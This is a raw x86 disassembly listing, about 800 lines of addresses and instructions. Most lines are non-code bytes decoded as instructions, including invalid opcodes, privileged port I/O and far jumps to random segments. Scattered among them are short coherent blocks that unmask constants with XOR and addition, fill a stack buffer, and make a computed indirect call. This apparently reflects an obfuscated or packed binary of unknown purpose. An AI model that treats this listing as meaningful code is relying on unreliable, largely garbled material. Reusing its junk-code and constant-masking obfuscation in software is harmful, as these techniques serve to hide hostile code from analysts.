  4121d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121d6:	sub    esi,DWORD PTR [edx+0x3f4c52c9]
  4121dc:	leave  
  4121dd:	push   ecx
  4121de:	pop    es
  4121df:	lea    eax,ds:0x2797bfc5
  4121e5:	retf   0x977d
  4121e8:	ins    BYTE PTR es:[edi],dx
  4121e9:	push   0x460bdb93
  4121ee:	push   ds
  4121ef:	push   edi
  4121f0:	sub    BYTE PTR [eax+edi*1-0x60],bl
  4121f4:	sti    
  4121f5:	dec    edi
  4121f6:	fdiv   QWORD PTR [eax+0x2a]
  4121f9:	mov    dl,0x27
  4121fb:	xlat   BYTE PTR ds:[ebx]
  4121fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121fd:	ror    esi,cl
  4121ff:	pop    ss
  412200:	mov    ebx,cs
  412202:	popf   
  412203:	mov    ch,0x30
  412205:	and    edx,DWORD PTR [edx+0x1b61b15b]
  41220b:	jmp    0xf4b1:0xd410ac7f
  412212:	das    
  412213:	push   ebp
  412214:	xchg   DWORD PTR ds:0x26855e94,edx
  41221a:	cmc    
  41221b:	jo     0x412200
  41221d:	adc    eax,0x3ec3e005
  412222:	pop    esp
  412223:	pop    esp
  412224:	fadd   QWORD PTR [ebp+0x54]
  412227:	mov    edx,esi
  412229:	mov    esp,0xf154ded2
  41222e:	je     0x41222e
  412230:	popf   
  412231:	mov    dl,0xfc
  412233:	mov    edi,0x5f8f7e86
  412238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412239:	das    
  41223a:	pop    esi
  41223b:	(bad)  
  41223c:	clc    
  41223d:	xor    eax,0xf1974d89
  412242:	jl     0x4121ec
  412244:	outs   dx,BYTE PTR ds:[esi]
  412245:	or     BYTE PTR [edi-0x63],bh
  412248:	out    0x5c,al
  41224a:	sbb    eax,0xf987becf
  41224f:	jmp    FWORD PTR [ebp-0x6942a81a]
  412255:	jl     0x4121f0
  412257:	mov    al,ds:0x13341027
  41225c:	test   DWORD PTR [ebp+0x77],ebp
  41225f:	jbe    0x412225
  412261:	call   DWORD PTR [esi]
  412263:	in     eax,dx
  412264:	cdq    
  412265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412266:	enter  0x6458,0xb3
  41226a:	pop    esp
  41226b:	push   ecx
  41226c:	ret    
  41226d:	xor    BYTE PTR [ebp+esi*4-0xc],cl
  412271:	jns    0x4122c1
  412273:	(bad)  
  412274:	repz mov ecx,edx
  412277:	sbb    BYTE PTR [eax],0x44
  41227a:	cwde   
  41227b:	aad    0x97
  41227d:	test   BYTE PTR [ebx+0x63888243],0x15
  412284:	dec    ecx
  412285:	cmp    ebp,DWORD PTR [ebx+0x17]
  412288:	retf   0xfeef
  41228b:	cmp    eax,0xa1d52418
  412290:	add    BYTE PTR [eax-0x5a],bl
  412293:	outs   dx,DWORD PTR ds:[esi]
  412294:	pushf  
  412295:	sub    dh,bl
  412297:	adc    bl,dl
  412299:	push   ebx
  41229a:	add    eax,0xc5d07b62
  41229f:	popa   
  4122a0:	dec    edx
  4122a1:	adc    dl,BYTE PTR [eax+ecx*8-0x1]
  4122a5:	mov    ds,WORD PTR [esi]
  4122a7:	sahf   
  4122a8:	xlat   BYTE PTR ds:[ebx]
  4122a9:	cmp    eax,DWORD PTR [edi]
  4122ab:	shl    esi,0xcc
  4122ae:	pop    esi
  4122af:	jae    0x4122a6
  4122b1:	pop    ss
  4122b2:	cmp    DWORD PTR [esi],0x8b0c4589
  4122b8:	inc    ebp
  4122b9:	cld    
  4122ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4122bd:	xor    eax,0x7510851
  4122c2:	add    eax,ebx
  4122c4:	cmp    ecx,eax
  4122c6:	jne    0x4122d9
  4122cc:	mov    eax,DWORD PTR [ebp-0x4]
  4122cf:	xor    eax,0x7510851
  4122d4:	jmp    0x411ea0
  4122d9:	mov    eax,DWORD PTR [ebp+0xc]
  4122dc:	jmp    0x4124dc
  4122e1:	xchg   DWORD PTR [eax],esp
  4122e3:	aam    0x43
  4122e5:	jne    0x41235a
  4122e7:	xchg   ecx,eax
  4122e8:	in     al,dx
  4122e9:	sub    BYTE PTR [ebx-0x32cbec13],ch
  4122ef:	push   edi
  4122f0:	retf   0x5c7e
  4122f3:	jle    0x412373
  4122f5:	pop    ecx
  4122f6:	jg     0x412376
  4122f8:	jle    0x412336
  4122fa:	ja     0x4122df
  4122fc:	and    DWORD PTR [edi-0x71],ecx
  4122ff:	fisttp WORD PTR ds:[ebx]
  412302:	jle    0x4122fa
  412304:	ins    DWORD PTR es:[edi],dx
  412305:	shl    DWORD PTR [edx-0x7efd5782],1
  41230b:	ins    BYTE PTR es:[edi],dx
  41230c:	dec    eax
  41230d:	fbstp  TBYTE PTR [ebx]
  41230f:	(bad)  
  412310:	repnz fwait
  412312:	mov    eax,ds:0xb93ba76e
  412317:	mov    ch,0x2f
  41231a:	jl     0x4122e4
  41231c:	leave  
  41231d:	and    eax,0xcca64f08
  412322:	out    0x1f,eax
  412324:	sbb    eax,0xe6e82a2d
  412329:	gs push edi
  41232b:	lds    ebx,FWORD PTR [ebx+0x6562b7a9]
  412331:	mov    eax,0x66b290fc
  412336:	call   DWORD PTR [edx]
  412338:	mov    ecx,0xf19d57f2
  41233d:	outs   dx,DWORD PTR ds:[esi]
  41233e:	xor    ch,dl
  412340:	dec    ecx
  412341:	int3   
  412342:	sub    edi,DWORD PTR ds:0x3ccacac1
  412348:	jae    0x412336
  41234a:	jmp    0x4122fc
  41234c:	sbb    DWORD PTR [esi],ebp
  41234e:	cmp    al,0xf3
  412350:	not    DWORD PTR [esi]
  412352:	or     BYTE PTR [ebx+0x0],ah
  412355:	and    eax,0xecd88b81
  41235a:	pop    edi
  41235b:	sub    dh,dl
  41235d:	jae    0x412350
  41235f:	rcr    DWORD PTR [ebx-0x71268b12],1
  412365:	add    esi,DWORD PTR [ebp-0x5e]
  412368:	shl    BYTE PTR [edx-0x52],0xc2
  41236c:	(bad)  
  41236d:	loop   0x41238c
  41236f:	or     ah,bh
  412371:	add    dh,BYTE PTR [eax-0x1fa2e0a7]
  412377:	jae    0x412371
  412379:	jnp    0x412303
  41237b:	xor    eax,0x1cb056b6
  412380:	sbb    eax,0x527e028b
  412385:	and    al,0x6
  412387:	sbb    esi,DWORD PTR [esi-0x27]
  41238a:	shl    DWORD PTR [ecx],0xdc
  41238d:	mov    cl,0x2f
  41238f:	std    
  412390:	dec    eax
  412391:	nop
  412392:	jns    0x412342
  412394:	ffreep st(2)
  412396:	dec    esp
  412397:	add    dh,BYTE PTR [edi+ebx*8-0x42]
  41239b:	jne    0x412377
  41239d:	jecxz  0x4123a5
  41239f:	lahf   
  4123a0:	imul   ebp,DWORD PTR fs:[ebx+0x28],0x7df1faf1
  4123a8:	fcomi  st,st(0)
  4123aa:	push   edi
  4123ab:	inc    eax
  4123ac:	sahf   
  4123ad:	mov    ebp,0x415bb8ec
  4123b2:	jg     0x4123f7
  4123b4:	daa    
  4123b5:	sub    edx,DWORD PTR es:[ebx-0x7c75df9e]
  4123bc:	cmp    esi,DWORD PTR [eax+0x40dd11a2]
  4123c2:	dec    ecx
  4123c3:	fld    TBYTE PTR [eax]
  4123c5:	(bad)  
  4123c6:	cli    
  4123c7:	pop    eax
  4123c8:	mov    ds:0xf1ecba9,eax
  4123cd:	mov    al,0x9a
  4123cf:	add    ch,ch
  4123d1:	xor    ebp,DWORD PTR ds:0x615ee3ec
  4123d7:	call   0xd748:0x7893a9a9
  4123de:	add    ebx,DWORD PTR [esi+0x43]
  4123e1:	js     0x4123da
  4123e3:	call   0x8569:0xbeb2cca7
  4123ea:	dec    edi
  4123eb:	jne    0x41242f
  4123ed:	cmp    al,0xf
  4123ef:	int3   
  4123f0:	mov    edx,0x6021880d
  4123f5:	adc    eax,0x9e3254bd
  4123fa:	and    DWORD PTR [edi+0x62],esi
  4123fd:	jno    0x412380
  4123ff:	stos   DWORD PTR es:[edi],eax
  412400:	push   ss
  412401:	and    esi,ebx
  412403:	cwde   
  412404:	aad    0x89
  412406:	popa   
  412407:	imul   eax,DWORD PTR [ebx],0xffffffdd
  41240a:	inc    eax
  41240b:	daa    
  41240c:	dec    DWORD PTR [ecx]
  41240e:	mov    esi,DWORD PTR [ebp+0x20891dc8]
  412414:	jle    0x41248f
  412416:	mov    al,0x58
  412418:	(bad)  
  412419:	in     al,dx
  41241a:	arpl   WORD PTR [ebx+0x10],di
  41241d:	cs mov al,0x57
  412420:	cmp    BYTE PTR [edi],ah
  412422:	fiadd  DWORD PTR [edx-0x59b08072]
  412428:	jns    0x412433
  41242a:	out    dx,eax
  41242b:	xor    al,0xcd
  41242d:	mov    cl,0xc6
  41242f:	mov    bl,0xf8
  412431:	xor    bh,BYTE PTR [edi]
  412433:	sahf   
  412434:	mov    ?,ebp
  412436:	and    ah,ch
  412438:	lahf   
  412439:	dec    eax
  41243a:	mov    esp,0xfd3bf522
  41243f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412440:	cs int 0xeb
  412443:	rcr    BYTE PTR ds:0x330f8e0a,cl
  412449:	addr16 (bad) 
  41244b:	sub    eax,0x4e1c6611
  412450:	sub    DWORD PTR [esi+0x570cfbe],eax
  412456:	je     0x412408
  412458:	std    
  412459:	sbb    eax,DWORD PTR [eax-0x20bea9d7]
  41245f:	adc    eax,DWORD PTR [edx+0x2d]
  412462:	sti    
  412463:	int    0x30
  412465:	sub    ecx,DWORD PTR [ebx+esi*2]
  412468:	outs   dx,BYTE PTR ds:[esi]
  412469:	fwait
  41246a:	inc    esi
  41246b:	jnp    0x4124da
  41246d:	sbb    ebp,DWORD PTR [ecx-0x4ef6baea]
  412473:	retf   
  412474:	push   ds
  412475:	dec    esp
  412476:	sar    DWORD PTR [bp+di-0x6cbc],cl
  41247b:	jecxz  0x412483
  41247d:	jle    0x4124a2
  41247f:	adc    DWORD PTR ds:0x9bb20cf2,0x2
  412486:	imul   ebp,DWORD PTR [ecx+0x34],0x6663b2ad
  41248d:	fdiv   st,st(7)
  41248f:	fwait
  412490:	adc    DWORD PTR [bp+di],eax
  412493:	mov    edi,0xfcedf669
  412498:	or     ecx,0x32
  41249b:	fdiv   DWORD PTR [eax+0x6]
  41249e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41249f:	push   ds
  4124a0:	mov    edi,0xb4f40a90
  4124a5:	mov    esp,0x70099af2
  4124aa:	mov    BYTE PTR [ebx+0x404fc9e8],dh
  4124b0:	jmp    0x412468
  4124b2:	inc    edx
  4124b3:	inc    ebx
  4124b4:	mov    edx,0xab21bad8
  4124b9:	call   0x7f0c48e3
  4124be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124bf:	test   DWORD PTR [ebp+0x359a8b4f],edi
  4124c5:	nop
  4124c6:	xchg   esi,eax
  4124c7:	adc    cl,dl
  4124c9:	jne    0x41248b
  4124cb:	mov    edi,0x54afa550
  4124d0:	(bad)  
  4124d1:	sub    eax,0x6f4ec0e0
  4124d6:	inc    ecx
  4124d7:	outs   dx,DWORD PTR ds:[esi]
  4124d8:	mov    al,ds:0x3dafbbb
  4124dd:	inc    ebp
  4124de:	or     BYTE PTR [ecx+0x458bf045],cl
  4124e4:	in     al,0x85
  4124e6:	ror    BYTE PTR [edi],0x84
  4124e9:	retf   0x4
  4124ec:	add    BYTE PTR [ecx+0xb6adc75],cl
  4124f2:	pop    ecx
  4124f3:	push   0x5
  4124f5:	dec    ecx
  4124f6:	pop    ebx
  4124f7:	xchg   ebx,ecx
  4124f9:	sub    ebx,ecx
  4124fb:	xchg   ebx,ecx
  4124fd:	dec    ecx
  4124fe:	mov    eax,DWORD PTR [ebp-0x1c]
  412501:	imul   eax,ecx
  412504:	sub    esp,eax
  412506:	mov    DWORD PTR [ebp-0x24],esp
  412509:	mov    eax,DWORD PTR [ebp-0x4]
  41250c:	mov    ecx,0x7510851
  412511:	xor    eax,ecx
  412513:	mov    edx,0x327299
  412518:	add    eax,edx
  41251a:	mov    DWORD PTR [ebp+0x8],eax
  41251d:	mov    eax,DWORD PTR [ebp-0x18]
  412520:	xor    eax,ecx
  412522:	add    eax,edx
  412524:	mov    edx,DWORD PTR [ebp+0x14]
  412527:	imul   eax,DWORD PTR [edx]
  41252a:	mov    edx,DWORD PTR [ebp-0x4]
  41252d:	xor    edx,ecx
  41252f:	mov    ecx,DWORD PTR [ebp+0x8]
  412532:	lea    ecx,[edx+ecx*1+0x327299]
  412539:	cmp    ecx,eax
  41253b:	je     0x4129b2
  412541:	mov    edi,DWORD PTR [ebp-0x18]
  412544:	mov    eax,DWORD PTR [ebp+0x8]
  412547:	mov    edx,DWORD PTR [ebp+0x14]
  41254a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41254e:	mov    ecx,0x7510851
  412553:	xor    edx,edx
  412555:	xor    edi,ecx
  412557:	mov    esi,0x327299
  41255c:	add    edi,esi
  41255e:	div    edi
  412560:	mov    edx,DWORD PTR [ebp-0x4]
  412563:	xor    edx,ecx
  412565:	lea    eax,[edx+eax*1+0x327299]
  41256c:	mov    edx,DWORD PTR [ebp+0x8]
  41256f:	mov    edi,DWORD PTR [ebp-0x24]
  412572:	mov    DWORD PTR [edi+edx*4],eax
  412575:	mov    eax,DWORD PTR [ebp-0x18]
  412578:	mov    edx,DWORD PTR [ebp+0x8]
  41257b:	xor    eax,ecx
  41257d:	lea    eax,[eax+edx*1+0x327299]
  412584:	mov    DWORD PTR [ebp+0x8],eax
  412587:	mov    eax,DWORD PTR [ebp-0x18]
  41258a:	mov    edx,DWORD PTR [ebp+0x14]
  41258d:	jmp    0x41278d
  412592:	inc    esp
  412593:	mov    edx,0x5c849cfa
  412598:	pop    esp
  412599:	push   edx
  41259a:	outs   dx,BYTE PTR ds:[esi]
  41259b:	outs   dx,DWORD PTR ds:[esi]
  41259c:	stos   DWORD PTR es:[edi],eax
  41259d:	(bad)  
  41259e:	and    eax,0x59f5f457
  4125a3:	pop    ebp
  4125a4:	jle    0x412624
  4125a6:	pop    ecx
  4125a7:	jg     0x412627
  4125a9:	jle    0x4125f2
  4125ab:	sub    DWORD PTR [eax],edx
  4125ad:	xor    al,0x80
  4125af:	sbb    DWORD PTR ds:0x13157735,eax
  4125b5:	push   ecx
  4125b6:	push   cs
  4125b7:	sub    dh,BYTE PTR [ecx+0x34]
  4125ba:	test   eax,0xf1ce2b6d
  4125bf:	aas    
  4125c0:	dec    edx
  4125c1:	enter  0xf2a5,0xd9
  4125c5:	sbb    ah,BYTE PTR [ecx+0x39]
  4125c8:	sti    
  4125c9:	das    
  4125ca:	imul   ebx,DWORD PTR ds:0xee5b78ec,0xffffffbb
  4125d1:	pop    ss
  4125d2:	add    eax,0xd125aab7
  4125d7:	cli    
  4125d8:	retf   
  4125d9:	mov    dh,0xb3
  4125db:	push   cs
  4125dc:	mov    ch,0x3
  4125de:	sub    BYTE PTR [ebx+0x592039cd],bl
  4125e4:	lock inc edi
  4125e6:	dec    esi
  4125e7:	cmp    BYTE PTR [edx-0x2d202c85],0xee
  4125ee:	xor    cl,BYTE PTR [ecx]
  4125f0:	add    edi,eax
  4125f2:	test   eax,0x268bfd56
  4125f7:	shl    DWORD PTR [esi+esi*8-0x67b4a66e],1
  4125fe:	adc    eax,0x575717f
  412603:	sbb    BYTE PTR [edx-0x43],0xfc
  412607:	sub    BYTE PTR [ebx-0x12],ch
  41260a:	sahf   
  41260b:	xchg   esp,eax
  41260c:	sbb    esp,edi
  41260e:	test   al,0x1b
  412610:	out    0xd4,al
  412612:	dec    edx
  412613:	xor    ebx,esp
  412615:	vprotq xmm1,xmm6,0x8e
  41261a:	mov    ebx,0xa8cd8480
  41261f:	cmp    dl,cl
  412621:	jl     0x4125b3
  412623:	es inc edi
  412625:	mov    bh,0xdb
  412627:	xor    DWORD PTR [eax+edi*2],ecx
  41262a:	jmp    0xefc:0xf31a9e72
  412631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412632:	nop
  412633:	xchg   esp,eax
  412634:	aaa    
  412635:	sbb    bh,BYTE PTR [esi]
  412637:	xchg   esp,eax
  412638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412639:	cmp    eax,eax
  41263b:	jbe    0x412609
  41263d:	xchg   edx,eax
  41263e:	in     eax,dx
  41263f:	ds mov al,cl
  412642:	xchg   esp,eax
  412643:	xchg   esi,eax
  412644:	sub    DWORD PTR [edx+0x3dcdff8c],esi
  41264a:	aad    0x41
  41264c:	lods   eax,DWORD PTR ds:[esi]
  41264d:	mov    bl,0xe6
  41264f:	sbb    eax,edx
  412651:	xor    ebx,0xb5b4b7d3
  412657:	(bad)  
  412658:	dec    ebx
  412659:	popa   
  41265a:	jl     0x4125ed
  41265c:	xlat   BYTE PTR ds:[ebx]
  41265d:	push   ss
  41265e:	pop    ebx
  41265f:	xor    ecx,DWORD PTR [edx]
  412661:	jbe    0x412632
  412663:	sbb    al,0x75
  412665:	fidivr DWORD PTR [edx]
  412667:	jp     0x4125f3
  412669:	ja     0x412691
  41266b:	(bad)  
  41266c:	pop    ss
  41266d:	or     ebx,DWORD PTR [esi-0x44]
  412670:	xor    DWORD PTR [eax+0x3ab8f787],ebp
  412676:	xchg   esi,esp
  412678:	jl     0x4126e0
  41267a:	sbb    al,0x7c
  41267c:	pop    edi
  41267d:	sbb    DWORD PTR [ecx+eiz*1+0x60],esp
  412681:	fdiv   QWORD PTR [esi]
  412683:	inc    ebp
  412684:	fisttp QWORD PTR [esi]
  412686:	adc    eax,0x16f1fb8b
  41268b:	xlat   BYTE PTR ds:[ebx]
  41268c:	(bad)  
  41268d:	and    al,0x2d
  41268f:	mov    WORD PTR [ebx+0x425f6978],gs
  412695:	dec    ebp
  412696:	jne    0x4126e1
  412698:	jne    0x412635
  41269a:	inc    ebp
  41269b:	xor    eax,0xb96e6315
  4126a0:	out    0xc8,eax
  4126a2:	jo     0x412720
  4126a4:	pushf  
  4126a5:	dec    esi
  4126a6:	aas    
  4126a7:	mov    ebp,0x14744d1e
  4126ac:	dec    ecx
  4126ad:	test   DWORD PTR [ebx],ecx
  4126af:	addr16 and eax,0xeb90c00f
  4126b5:	ss pop es
  4126b7:	jg     0x41270d
  4126b9:	pop    eax
  4126ba:	aam    0xb1
  4126bc:	mov    ebx,0xa193721d
  4126c1:	fistp  QWORD PTR [eax+0x56]
  4126c4:	push   bp
  4126c6:	data16 cmc 
  4126c8:	xor    al,0xad
  4126ca:	fadd   DWORD PTR [eax]
  4126cc:	mov    edx,DWORD PTR [ecx]
  4126ce:	(bad)  
  4126cf:	out    0xbb,eax
  4126d1:	jmp    0x78aa:0x89ebf0cc
  4126d8:	sbb    ch,BYTE PTR [edx+0x3a]
  4126db:	mov    ds:0xd6ba5cd5,eax
  4126e0:	(bad)
  4126e3:	fnsave [ebx+0x3184cda0]
  4126e9:	jmp    0x412737
  4126eb:	cmc    
  4126ec:	fs and bh,dl
  4126ef:	mov    ebx,0x81ddfd1
  4126f4:	fmul   QWORD PTR [edi]
  4126f6:	xchg   ebp,eax
  4126f7:	push   esi
  4126f8:	xor    DWORD PTR [ebx],edi
  4126fa:	es test ch,cl
  4126fd:	and    ecx,DWORD PTR [ebp+0x17cf947c]
  412703:	jno    0x4126c5
  412705:	adc    bl,BYTE PTR [ebp-0x7f996d8a]
  41270b:	sti    
  41270c:	bound  edx,QWORD PTR [ecx+0x47ff21de]
  412712:	fild   WORD PTR [ebx]
  412714:	or     al,0x8
  412716:	shld   DWORD PTR [edx-0x1d],ecx,0x29
  41271b:	jg     0x41277b
  41271d:	pop    ss
  41271e:	push   0x5f261f82
  412723:	icebp  
  412724:	sbb    DWORD PTR [ebx],esp
  412726:	dec    ebp
  412727:	push   eax
  412728:	icebp  
  412729:	push   ebp
  41272a:	add    BYTE PTR [ebx+edi*8-0x32],dl
  41272e:	js     0x4127aa
  412730:	out    0xea,eax
  412732:	push   ss
  412733:	pop    es
  412734:	lahf   
  412735:	jb     0x41279a
  412737:	mov    gs,WORD PTR [ebp+0x47b01737]
  41273d:	sub    DWORD PTR [esi],ecx
  41273f:	ss adc esp,eax
  412742:	mov    cl,0xac
  412744:	xlat   BYTE PTR ds:[ebx]
  412745:	sar    BYTE PTR [ebx+ebx*8],cl
  412748:	stos   DWORD PTR es:[edi],eax
  412749:	sbb    eax,0x7c67a76
  41274e:	push   esp
  41274f:	inc    DWORD PTR [edi]
  412751:	test   al,0x9e
  412753:	int3   
  412754:	ins    DWORD PTR es:[edi],dx
  412755:	jo     0x412731
  412757:	inc    esi
  412758:	jae    0x4126f5
  41275a:	aam    0x88
  41275c:	in     eax,0xee
  41275e:	mov    ds:0x4a82f37b,eax
  412763:	jl     0x412759
  412765:	mov    bh,dl
  412767:	or     eax,0xda8a53e1
  41276c:	cs dec esp
  41276e:	fs sahf 
  412770:	jg     0x4127d3
  412772:	test   BYTE PTR [esi-0x49e42dc8],al
  412778:	ins    BYTE PTR es:[edi],dx
  412779:	dec    edi
  41277a:	push   0x9
  41277c:	pop    esi
  41277d:	jmp    0x4127d8
  41277f:	jmp    0x9b2:0x38ee203b
  412786:	push   ecx
  412787:	sub    DWORD PTR [ecx],esp
  412789:	and    al,0x32
  41278b:	xlat   BYTE PTR ds:[ebx]
  41278c:	xor    DWORD PTR [ebx],0xffffffc1
  41278f:	jmp    0x41298f
  412794:	aaa    
  412795:	cmp    al,0xc7
  412797:	cdq    
  412798:	int    0x75
  41279a:	jno    0x412758
  41279c:	ja     0x41277e
  41279e:	loope  0x4127ba
  4127a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127a1:	and    al,0x37
  4127a3:	inc    DWORD PTR [edi+ebx*2+0x7e]
  4127a7:	jle    0x412802
  4127a9:	jg     0x412829
  4127ab:	jle    0x4127cf
  4127ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127ae:	push   ds
  4127af:	in     al,0xd0
  4127b1:	jb     0x41279b
  4127b3:	jecxz  0x4127a8
  4127b5:	cmp    DWORD PTR [edi],ecx
  4127b7:	ret    0x9a17
  4127ba:	hlt    
  4127bb:	cld    
  4127bc:	add    BYTE PTR [esi+0x3b],0x27
  4127c0:	(bad)  
  4127c1:	lea    ebx,[ecx]
  4127c3:	call   0x1d5d:0x8c49c7fd
  4127ca:	mov    DWORD PTR [ebp-0x296b4124],edx
  4127d0:	packssdw mm6,QWORD PTR [esi-0x6e0aec7c]
  4127d7:	cmp    esp,DWORD PTR [ebx-0x3ac6a404]
  4127dd:	(bad)
  4127e1:	pop    esp
  4127e2:	jae    0x4127f3
  4127e4:	xchg   BYTE PTR [ebx],ch
  4127e6:	cmp    dh,bl
  4127e8:	sahf   
  4127e9:	popa   
  4127ea:	popa   
  4127eb:	in     al,0x7
  4127ed:	mov    BYTE PTR [esi+eiz*8+0x4207f4b5],bl
  4127f4:	adc    DWORD PTR [eax-0x13cf88a1],edi
  4127fa:	(bad)  
  4127fb:	es jbe 0x4127ea
  4127fe:	inc    eax
  4127ff:	sbb    esp,eax
  412801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412802:	lock and ah,BYTE PTR [ebx-0x5a]
  412806:	adc    eax,0x77236983
  41280b:	pop    es
  41280c:	adc    eax,0xb4874f6d
  412811:	popf   
  412812:	push   eax
  412813:	idiv   BYTE PTR [esi]
  412815:	and    BYTE PTR [eax+0x7f4c68e8],al
  41281b:	add    esp,DWORD PTR [ecx+0x54]
  41281e:	sahf   
  41281f:	mov    ch,0x1a
  412821:	xor    eax,0xd7286d3d
  412826:	mov    ebp,0x2f2636f5
  41282b:	jo     0x41282a
  41282d:	pop    ds
  41282e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41282f:	int    0x4f
  412831:	mov    edi,DWORD PTR [edx+0x29]
  412834:	jle    0x41286f
  412836:	mov    ds:0xf0425cd5,eax
  41283b:	or     DWORD PTR [ebp-0x4c],esi
  41283e:	xor    BYTE PTR [eax],cl
  412840:	out    0x95,eax
  412842:	mov    ds:0xe9b24213,eax
  412847:	fwait
  412848:	push   ebp
  412849:	fbld   TBYTE PTR [edx]
  41284b:	mov    dh,0x60
  41284d:	jg     0x41282d
  41284f:	pop    esi
  412850:	aaa    
  412851:	jle    0x4128b0
  412853:	or     ebx,DWORD PTR [esi+0xaf427ef]
  412859:	inc    esi
  41285a:	jns    0x41283a
  41285c:	in     eax,0xf0
  41285e:	sub    bh,ch
  412860:	out    dx,al
  412861:	clc    
  412862:	xor    al,0x85
  412864:	iret   
  412865:	mov    edx,0x8ec23bba
  41286a:	sub    eax,0x7e67655e
  41286f:	loop   0x4128be
  412871:	and    al,0x7
  412873:	div    cl
  412875:	(bad)  
  412876:	mov    dl,0x85
  412878:	mov    esi,0xf79dcef3
  41287d:	or     al,BYTE PTR [ecx-0x83b4197]
  412883:	adc    ebp,DWORD PTR [edx]
  412885:	and    eax,0x1fbc6f98
  41288a:	sbb    eax,0x7ebc86b6
  41288f:	rcl    BYTE PTR [esi+0x474f9531],cl
  412895:	pop    ebp
  412896:	push   ebx
  412897:	xchg   ebp,eax
  412898:	retf   0xf546
  41289b:	xor    eax,0xe2cc62c9
  4128a0:	and    edx,esp
  4128a2:	mov    eax,0x4f28bfb2
  4128a7:	jp     0x4128a0
  4128a9:	(bad)
  4128ad:	adc    ch,0x85
  4128b0:	sbb    eax,0xae6cdbd5
  4128b6:	sti    
  4128b7:	mov    bl,0x88
  4128b9:	sbb    eax,0xeca4deb9
  4128be:	mov    bl,0x33
  4128c0:	cmp    edi,eax
  4128c2:	(bad)  
  4128c4:	adc    eax,0x29cfdb87
  4128c9:	inc    DWORD PTR [eax]
  4128cb:	sbb    DWORD PTR ds:0x82cca721,esp
  4128d1:	mov    eax,ds:0x946947ee
  4128d6:	pop    ds
  4128d7:	and    eax,0xee72a249
  4128dc:	hlt    
  4128dd:	out    dx,eax
  4128de:	jmp    0xb6e:0x67858180
  4128e5:	mov    ds:0xb4ed73fe,al
  4128ea:	adc    ah,BYTE PTR [ecx+edi*4-0x7e]
  4128ee:	lods   al,BYTE PTR ds:[esi]
  4128ef:	sub    esi,DWORD PTR [esi]
  4128f1:	cmp    edi,DWORD PTR [ecx+0x4d2d087d]
  4128f7:	sbb    cl,BYTE PTR [eax+0x60]
  4128fa:	(bad)  
  4128fb:	aad    0x8c
  4128fd:	and    bp,di
  412900:	dec    eax
  412901:	out    dx,eax
  412902:	mov    al,BYTE PTR [eax]
  412904:	nop
  412905:	shl    DWORD PTR [ecx+0x726afc5a],1
  41290b:	test   al,bl
  41290d:	jp     0x41290e
  41290f:	outs   dx,DWORD PTR ds:[esi]
  412910:	loope  0x412936
  412912:	xor    dl,ch
  412914:	out    dx,al
  412915:	sub    edi,DWORD PTR [ebp+0x36aa3c2f]
  41291b:	enter  0x934c,0x3c
  41291f:	je     0x412919
  412921:	out    dx,al
  412922:	sti    
  412923:	dec    edx
  412924:	mov    eax,ds:0xb75b9972
  412929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41292a:	sub    BYTE PTR [esi-0x196dafc4],bl
  412930:	in     al,0xc
  412932:	cmc    
  412933:	dec    eax
  412934:	mov    ds:0x30de890e,eax
  412939:	jo     0x4128fd
  41293b:	or     dl,BYTE PTR [ecx]
  41293d:	mov    al,ds:0xe29b8862
  412942:	in     al,0x36
  412944:	mov    esi,0xbee626b5
  412949:	shr    BYTE PTR [esi],1
  41294b:	sbb    DWORD PTR [ecx],ecx
  41294d:	popf   
  41294e:	push   esi
  41294f:	icebp  
  412950:	mov    cl,BYTE PTR [ecx+0x3444dc1e]
  412956:	inc    ebp
  412957:	mov    BYTE PTR [edx],ch
  412959:	pop    ds
  41295a:	jg     0x412917
  41295c:	int3   
  41295d:	mov    bh,0xe8
  41295f:	or     DWORD PTR [ecx-0x43675787],ebp
  412965:	in     al,0x61
  412967:	in     al,0x5f
  412969:	jno    0x412919
  41296b:	mov    al,0xdd
  41296d:	sbb    eax,0x63031c3f
  412972:	enter  0x55f0,0x79
  412976:	mov    eax,0xf3985385
  41297b:	popf   
  41297c:	adc    BYTE PTR [ecx],dl
  41297e:	retf   
  41297f:	shl    DWORD PTR ds:0xffb541ef,cl
  412985:	or     DWORD PTR [ebp+0x7804e243],ecx
  41298b:	loope  0x412993
  41298d:	or     esi,esi
  41298f:	add    eax,esi
  412991:	imul   eax,DWORD PTR [edx]
  412994:	mov    edx,DWORD PTR [ebp-0x4]
  412997:	xor    edx,ecx
  412999:	mov    ecx,DWORD PTR [ebp+0x8]
  41299c:	lea    ecx,[edx+ecx*1+0x327299]
  4129a3:	cmp    ecx,eax
  4129a5:	jne    0x412541
  4129ab:	mov    ebx,esi
  4129ad:	jmp    0x4129b7
  4129b2:	mov    ebx,0x327299
  4129b7:	mov    eax,DWORD PTR [ebp-0x4]
  4129ba:	xor    eax,0x7510851
  4129bf:	add    eax,ebx
  4129c1:	mov    DWORD PTR [ebp-0xc],eax
  4129c4:	xor    ebx,ebx
  4129c6:	lea    eax,[ebp-0x10]
  4129c9:	add    ebx,DWORD PTR [eax]
  4129cb:	call   ebx
  4129cd:	xor    ebx,ebx
  4129cf:	inc    ebx
  4129d0:	cmp    DWORD PTR [ebp+0x10],ebx
  4129d3:	je     0x412bf1
  4129d9:	xchg   edx,eax
  4129da:	push   0xa
  4129dc:	pop    ecx
  4129dd:	jmp    0x412bdd
  4129e2:	jmp    0x757c:0x13b47be7
  4129e9:	popa   
  4129ea:	cmc    
  4129eb:	xchg   dh,dl
  4129ed:	fcomp  DWORD PTR [esi-0x589960cb]
  4129f3:	pop    ecx
  4129f4:	jle    0x412a74
  4129f6:	pop    ecx
